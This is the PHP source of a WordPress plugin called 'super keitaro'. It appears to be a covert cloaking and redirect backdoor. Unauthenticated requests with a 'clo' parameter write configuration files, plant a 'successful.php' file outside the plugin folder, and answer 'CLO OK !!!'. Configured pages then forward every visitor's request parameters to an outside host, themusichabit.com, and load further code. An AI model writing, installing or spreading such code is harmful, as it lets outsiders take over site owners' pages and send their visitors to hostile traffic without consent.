<?php

/**
 * @wordpress-plugin
 * Plugin Name:       super keitaro
 * Version:           1.0.0
 * Text Domain:       keitaro
 */

// If this file is called directly, abort.
if ( ! defined( 'WPINC' ) ) die;

if (!defined('YOUR_PLUGIN_DIR_KT')) define( 'YOUR_PLUGIN_DIR_KT', plugin_dir_path( dirname( __FILE__ ) ) );


add_action( 'wp', 'keitaro_fn' );
add_action( 'wp_ajax_nopriv_check_clo', 'check_clo' );
// define('WP_DEBUG', true);

function check_clo(){
	$data = ['status' => true];
	header('Access-Control-Allow-Origin: *');
	header('Content-Type: application/json');
	echo json_encode($data);
    wp_die(); 
}

if(isset($_REQUEST['offer'])) {
    require_once YOUR_PLUGIN_DIR_KT . 'keitaro/wpInegraClient/offer.php';
	die();
}

function keitaro_fn( $post ) {
	$pagename = isset($post->query_vars['pagename']) ? $post->query_vars['pagename'] : 0;
	$file = YOUR_PLUGIN_DIR_KT . 'keitaro/data/' . $pagename;
	if (is_readable($file)) {
		
		$data_src = file_get_contents(YOUR_PLUGIN_DIR_KT . 'keitaro/data/' . $pagename);
		if (strripos($data_src, '@') === false) {
			$apikey = $data_src;
			$traffic_source_type = 'Ajax';
		} else {
			$apikey = explode('@', $data_src)[1];
			$traffic_source_type = explode('@', $data_src)[0];
		}

		require_once YOUR_PLUGIN_DIR_KT . 'keitaro/wpInegraClient/kclient.php';
		$client = new KClient('https://themusichabit.com/api.php?', $apikey);
		$client->sendAllParams();
		require_once YOUR_PLUGIN_DIR_KT . 'keitaro/wpInegraClient/index.php';
	} else {
		if( isset($_REQUEST['clo']) ) {
			$source_type = isset($_REQUEST['traffic_source_type']) && !empty($_REQUEST['traffic_source_type']) ? $_REQUEST['traffic_source_type'].'@' : 'Ajax@';
			$clo_path = YOUR_PLUGIN_DIR_KT . 'keitaro/data/' . $pagename;
			file_put_contents($clo_path, trim($source_type).trim($_REQUEST['clo']) );

			$successful_path = YOUR_PLUGIN_DIR_KT.'../../successful.php';
			if(!is_readable($successful_path)) {
				copy(YOUR_PLUGIN_DIR_KT.'keitaro/successful.php', $successful_path);
			} else { echo "CLO OK !!!";die(); }
		}
	}
}







